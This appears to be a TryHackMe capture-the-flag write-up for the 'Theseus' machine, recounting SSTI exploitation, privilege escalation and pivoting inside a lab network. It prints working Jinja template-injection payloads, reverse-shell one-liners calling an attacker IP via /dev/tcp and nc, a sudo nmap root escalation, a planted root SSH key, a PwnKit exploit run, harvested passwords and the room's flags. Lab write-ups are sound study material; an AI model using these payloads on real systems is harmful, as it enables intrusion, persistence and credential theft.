### THM---Theseus

# Writeup for the TRYHACKME machine called 'Theseus'

---

<img width="917" height="293" alt="nmap-theseus" src="https://github.com/user-attachments/assets/99d41231-0297-41ce-92fd-d1f803f2669a" />

---

#  On PORT 80 we find:

<img width="959" height="837" alt="port-80" src="https://github.com/user-attachments/assets/a6e72953-e8c2-4675-828b-0c4e0561ef9d" />

TGUE?O·S·K·MTUEGI·SYENFE·TOI···SRO·T·SF·OYT···O·T·KUMH·I·AE·NMK··

---

Strip the dots and we get:

TGUE?OSKMTUEGISYENFETOISROTSFOYTOTKUMHIAENMK

Looks like a Scytale cipher. We need a key (it should be at the fifth position based on the question mark, right?)

Ah, I see. This isn't actually a cipher we need to crack. It just hints at a 'key'. If we use Arjun we see why:

<img width="571" height="249" alt="arjun" src="https://github.com/user-attachments/assets/6cc5f9cb-27ce-4209-acc0-93843bb4d032" />

---

#  So, we know that there is a parameter called 'key'. Not sure if the value of '5' has anything to do with it or not (hint it doesn't)


After some messing around:


http://theseus.thm:8080/?key={{7*7}}

49


#  BOOM!!  SSTI

---

Trying a few standard SSTI payloads


```http://theseus.thm:8080/?key={{%20os.popen(%27id%27).read()%20}}```


Produces an 'Internal Server Error'


#  However,  

```{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}```

<img width="1204" height="267" alt="ssti" src="https://github.com/user-attachments/assets/18028f4c-cb20-49f2-8bd1-2dc44a75e53a" />

WORKS!!  We get  'uid=1001(minos) gid=1001(minos) groups=1001(minos)'


---


```{{request.application.__globals__.__builtins__.__import__('os').popen('bash+-c+"bash+-i+>%26+/dev/tcp/10.64.131.111/9001+0>%261"').read()}}```

NO GOOD! Hmmm

THIS WORKS THOUGH!!


```{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}```

<img width="1467" height="646" alt="passwd" src="https://github.com/user-attachments/assets/8b2990c2-d680-4539-aa2c-507a963e1be4" />

---

#  I messed around a bit and found out that spaces were causing the 400 errors. We can replace spaces with ${IFS} and get the first flag:

<img width="1093" height="384" alt="flag1" src="https://github.com/user-attachments/assets/35026a54-d94d-4cbb-980b-deaa2e1bd330" />

THM{499a89a2a064426921732e7d31bc08a}


---


```GET /?key={{request.application.__globals__.__builtins__.__import__('os').popen('ls${IFS}-al${IFS}/home/minos/').read()}} HTTP/1.1```

>HTTP/1.0 200 OK
>Content-Type: text/html; charset=utf-8
>Content-Length: 694
>Server: Werkzeug/1.0.1 Python/2.7.17
>Date: Sat, 29 Nov 2025 02:58:09 GMT
>
>total 16
>drwxr-xr-x 6 minos minos   13 Aug 20  2020 .
>drwxr-xr-x 3 minos minos    3 Aug  3  2020 ..
>drwxr-xr-x 5 minos minos    6 Aug  3  2020 .Website
>lrwxrwxrwx 1 minos minos    9 Aug  3  2020 .bash_history -&gt; /dev/null
>-rw-r--r-- 1 minos minos  220 Aug  3  2020 .bash_logout
>-rw-r--r-- 1 minos minos 3771 Aug  3  2020 .bashrc
>drwx------ 2 minos minos    3 Aug  3  2020 .cache
>drwx------ 3 minos minos    3 Aug  3  2020 .gnupg
>-rw-r--r-- 1 minos minos  807 Aug  3  2020 .profile
>drwx------ 2 minos minos    3 Aug  4  2020 .ssh
>-rw------- 1 minos minos 7005 Aug 20  2020 .viminfo
>-rw-r--r-- 1 minos minos  960 Aug 20  2020 Crete_Shores
>-rw-r--r-- 1 minos minos   37 Aug  3  2020 Minos_Flag


#  What is that 'Crete_Shores' file?

<img width="1216" height="670" alt="crete-shores" src="https://github.com/user-attachments/assets/f8f5b681-767f-42ce-9f51-c63d039bb2bd" />


#  AHA!  Nice. New user and pass


>username: 		entrance
>
>password:  		Knossos


---

Start a listener on 9001


```echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.146.127 9001 >/tmp/f' | base64```

cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDE5Mi4xNjguMTQ2LjEyNyA5MDAxID4vdG1wL2YK


```/?key={{request.application.__globals__.__builtins__.__import__(%27os%27).popen('echo%20cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDE5Mi4xNjguMTQ2LjEyNyA5MDAxID4vdG1wL2YK%20|%20base64%20-d%20|%20bash').read()}}```

<img width="944" height="282" alt="revshell" src="https://github.com/user-attachments/assets/136b87d8-6c82-4c1a-9097-19eec4fe0d06" />

---

#  Drop linpeas.sh on the box and see what we find

<img width="928" height="728" alt="setuid" src="https://github.com/user-attachments/assets/15d46411-fcb9-435e-b2f8-7e22ba3e9840" />

#  Some interesting binaries we might need:

>/usr/bin/base64                                                                              
>/usr/bin/curl
>/usr/bin/g++
>/usr/bin/gcc
>/usr/bin/lxc
>/usr/bin/make
>/bin/nc
>/usr/bin/ncat
>/bin/netcat
>/usr/bin/nmap
>/usr/bin/perl
>/bin/ping
>/usr/bin/python
>/usr/bin/python2
>/usr/bin/python2.7
>/usr/bin/python3


---


(remote) minos@Minos:/tmp$ sudo -l
Matching Defaults entries for minos on Minos:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User minos may run the following commands on Minos:
    (root) NOPASSWD: /usr/bin/nmap

<img width="937" height="757" alt="gtfobins" src="https://github.com/user-attachments/assets/3828ce83-a87f-4d6a-88fb-63e3985eb67e" />


```
TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
sudo nmap --script=$TF
```

##  BOOM!  We are root

---

<img width="559" height="235" alt="deadend" src="https://github.com/user-attachments/assets/7304f13b-430b-407d-be6d-ede8fd4efe20" />

#  Haha, ok. Well, looks like we'll need to look elsewhere

---

Weird, my pwncat shell gets messed up when I got root!? 

<img width="942" height="324" alt="netstat" src="https://github.com/user-attachments/assets/790e545f-2fa5-4a69-a4c5-6bc4688ad975" />

<img width="743" height="506" alt="internal-nmap" src="https://github.com/user-attachments/assets/03292366-fb8b-45e0-a1af-cd0902c846e0" />


##  This is kind of clunky. Let's generate an ssh key, put it in /root/.ssh/authorized_keys and then just jump on the box directly.


```ssh-keygen -t ed25519 -f ~/theseus_key -q -N ""```


In the /root/.ssh directory

```echo '<key value>' >> authorized_keys```


Exit our poor, suffering pwncat shell and...

<img width="772" height="577" alt="ssh" src="https://github.com/user-attachments/assets/a6a0ad1c-4cdf-453c-b2aa-a6920d6a64ad" />

```ssh -i theseus_key root@10.64.159.130```

---

<img width="949" height="385" alt="minos-lxd" src="https://github.com/user-attachments/assets/c2aac07a-f108-4a2a-baca-49633940738a" />

<img width="855" height="970" alt="full-scan" src="https://github.com/user-attachments/assets/8a594e51-6245-44b1-a5e2-193e6bd92b69" />


ip-10-71-235-1.ec2.internal (10.71.235.1)
Labyrinth.minos-lxd			(10.71.235.159)
Athens.lxd 					(10.71.235.37)
Minos.lxd 					(10.71.235.7)

---

##  We have those creds from above. Maybe we can just ssh into Athens.lxd or Labyrinth.lxd??


```ssh entrance@10.71.235.159```

password:  Knossos

<img width="807" height="518" alt="entrance" src="https://github.com/user-attachments/assets/0da992d4-f312-4fcb-898a-05311d7ae13e" />


#  We are in!!

---

#  Look around a bit:

<img width="942" height="657" alt="labyrinth" src="https://github.com/user-attachments/assets/3e481a45-f9f7-4cb7-a365-02b8a7df41ca" />


#   So, it looks like we have to do some binary exploitation? From the explanation and the fact that we are given what looks like a base_addr ??

#   Let's run linpeas.sh  first and see if anything jumps out at us

<img width="944" height="629" alt="pkexec" src="https://github.com/user-attachments/assets/4aabc2d3-56f2-4bb7-b9ed-3dc9e7ceefb1" />


#  Whoa, that's a pretty obvious privesc

```entrance@Labyrinth:~$ python3 CVE-2021-4034.py 
[+] Creating shared library for exploit code.
[+] Calling execve()
# whoami
root```

## THAT WAS EASY!!

---

#  Look around some more:

<img width="745" height="804" alt="minotaur-flag" src="https://github.com/user-attachments/assets/6dbcbaf1-8985-4b02-b2de-fb17ad8cb053" />


THM{c307b8045208fac06b9faa90e68d2ad4}


#  We are root so we should be able to just grab the other flag, no?

<img width="623" height="903" alt="labyrinth-flag" src="https://github.com/user-attachments/assets/11ff4e78-c4c7-4c2a-a47d-b81d2f3356bc" />


THM{6154ea526254375613650183962bf431}

#  Check out some other files. This could be useful:

> cat ariadne
Username: ariadne
Password: TheLover

---

#  Set up port forwarding to get access to the interior network (ligolo and chisel are too new so they don't work easily)

<img width="783" height="114" alt="port-forward" src="https://github.com/user-attachments/assets/a5337c86-896e-4bca-a4c4-23deaec5c4d9" />

<img width="907" height="200" alt="laby-down" src="https://github.com/user-attachments/assets/8b41771d-ad7f-4c1b-a9e9-6035fce9da47" />


#  Grab the other files (ariadne and thread) in the same manner

---

#  Weird, I have been trying to reverse the 'thread' binary and it seems like a 'ret2win' type challenge, but the ariadne file seems to be an obfuscated jpeg!?

#  I fooled around with it and removed some superfluous garbage at the beginning of the file. I was finally able to view it. Here is one method:


Find the offset to the jpeg marker:


```grep -oba $'\xFF\xDB' ariadne | head 

20:�� 
89:��```


Which means:

```Offset 20: FF DB
Offset 89: FF DB```


#  So, we need to extract everything (meaning the jpeg body) strarting from offset 20 and make a .bin file. Then, create a .bin header file. And then, combine the two files. 


```dd if=ariadne of=jpeg_body.bin bs=1 skip=20

29700+0 records in 
29700+0 records out 
29700 bytes (30 kB, 29 KiB) copied, 0.0637139 s, 466 kB/s```


```printf "\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00" > jpeg_header.bin```


```cat jpeg_header.bin jpeg_body.bin > final.jpg```


---

##  Now, just open the file:  xdg-open final.jpg

![ariadne](https://github.com/user-attachments/assets/75a28caf-c574-4532-8444-566fd8ab9dc4)


Is that  a user and password?


username: 		Shore
password: 		KingAegeus

---

ssh Shore@10.71.235.37

password: 		KingAegeus


#  OK, after about a hundred freakin' tries, I finally just randomly tried using a lowercase 's'  for 'Shore' (which is what it says in the bloody pic) and I got IN!!!!


So, use   ssh shore@10.71.235.37

<img width="833" height="547" alt="shore" src="https://github.com/user-attachments/assets/e4a055c0-df19-401b-b7cb-ce8f378132cb" />

<img width="545" height="623" alt="blacksails" src="https://github.com/user-attachments/assets/ab56a5db-edf9-4948-b9a7-1e2a5156c4f7" />

---

##  AND WE ARE FINALLY DONE!!

<img width="636" height="583" alt="final-flag" src="https://github.com/user-attachments/assets/77ac59dd-1099-4785-a83b-e8ac9250ae7e" />

THM{bb2af471e0aea04e982c2e5d0a6fa404}
